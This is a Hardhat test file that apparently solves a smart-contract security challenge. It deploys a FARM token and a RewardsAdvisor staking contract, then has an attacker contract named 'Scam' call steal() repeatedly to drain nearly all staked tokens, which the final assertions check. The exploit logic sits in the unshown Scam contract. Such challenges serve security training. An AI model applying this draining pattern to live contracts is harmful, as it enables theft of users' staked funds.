import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { start } from "repl";
import { contracts, Farm__factory } from "../typechain-types";
import { erc20 } from "../typechain-types/@openzeppelin/contracts/token";



describe("Token Test", () => {

  const BN = BigNumber;
  let precision = BN.from(10).pow(18);
  
  let accounts: Signer[];
  let attacker: Signer;
  let o1: Signer;
  let o2: Signer;
  let admin: Signer; // should not be used
  let adminUser: Signer; // should not be used
  let govToken: Contract;
  let rewardsAdvisor: Contract;
  let farm: Contract; // farm token
  let scam: Contract;

  /// preliminary state
  before(async () => {

    accounts = await ethers.getSigners();
    [attacker, o1, o2, admin, adminUser] = accounts;

    // deploying `FARM` token contract
    let farmTokenFactory = await ethers.getContractFactory('Farm')
    console.log("deploying token...");
    farm = await farmTokenFactory.connect(admin).deploy();
    await farm.deployed();
    const farmAddress = (farm.address);
    console.log(`farmToken deployed to: ${farmAddress}`);
    const name = await farm.name();
    console.log(`Token Name: ${name}\n`);
    const decimals = await farm.decimals();
    console.log(`Token Decimal: ${decimals}\n`);
    console.log('Querying token supply...');



    const farmT = await ethers.getContractAt("Farm", farmAddress);
    const symbol = await farmT.symbol();
    console.log(`Token Symbol: ${symbol}\n`);

    const totalSupply = await farmT.totalSupply();
    console.log(await `Token TOTALSUPPLY: ${totalSupply}\n`);

    console.log('Getting the balance of contract owner...');
    const ownerAddress = await admin.getAddress();
    console.log(ownerAddress)
    const ownerBalance = await farm.balanceOf(ownerAddress);
    console.log( await `Contract owner at ${ownerAddress} has a ${symbol} balance of ${ethers.utils.formatUnits(ownerBalance, decimals)}\n`);



    console.log("hello")
    
    await farmT.connect(admin).transfer(await adminUser.getAddress(), precision.mul(10_000) )
    await farmT.connect(admin).transfer(await attacker.getAddress(), precision.mul(1) )

    console.log(await farm.balanceOf(adminUser.getAddress()));
    console.log(await farm.balanceOf(attacker.getAddress()));
    console.log(await farm.balanceOf(admin.getAddress()));


    // deploying protocol contracts
    let govTokenFactory = await ethers.getContractFactory('GovToken')
    govToken = await govTokenFactory.connect(admin).deploy("xFARM","xFARM")
    console.log("govToken deployed to:", govToken.address);
    console.log(await govToken.owner())

    let rewardsAdvisorFactory = await ethers.getContractFactory('RewardsAdvisor')
    rewardsAdvisor = await rewardsAdvisorFactory.connect(admin).deploy(farm.address,govToken.address)
    console.log(await rewardsAdvisor.address)


    await govToken.connect(admin).transferOwnership(rewardsAdvisor.address)

    console.log(await govToken.owner())


    // other user stakes their `FARM` token
    let adminUserAddress = await adminUser.getAddress()
    await farm.connect(adminUser).approve(rewardsAdvisor.address,ethers.constants.MaxUint256)
    await rewardsAdvisor.connect(adminUser).deposit(precision.mul(10_000),adminUserAddress,adminUserAddress)
    console.log(await farm.balanceOf(adminUser.getAddress()));
    console.log(await farm.balanceOf(rewardsAdvisor.address));
  });

  it("solves the challenge", async function () {

    // implement solution here

    let scamFactory = await ethers.getContractFactory('Scam')
    scam = await scamFactory.connect(attacker).deploy(rewardsAdvisor.address)


    console.log(await scam.address);
    console.log(await farm.balanceOf(rewardsAdvisor.address));
  
    scam.connect(attacker).steal()
    scam.connect(attacker).steal()
    scam.connect(attacker).steal()
   
   
    console.log(await farm.balanceOf(attacker.getAddress()));
    console.log(await farm.balanceOf(rewardsAdvisor.address));

  });


  /// expected final state
    after(async () => {

      // attacker drains 99.99%+ of the `FARM` tokens from RewardsAdvisor staking contract
      expect(await farm.balanceOf(await attacker.getAddress())).to.be.gte(precision.mul(10_000))
      expect(await farm.balanceOf(rewardsAdvisor.address)).to.be.lte(precision.mul(1))

    });
}) 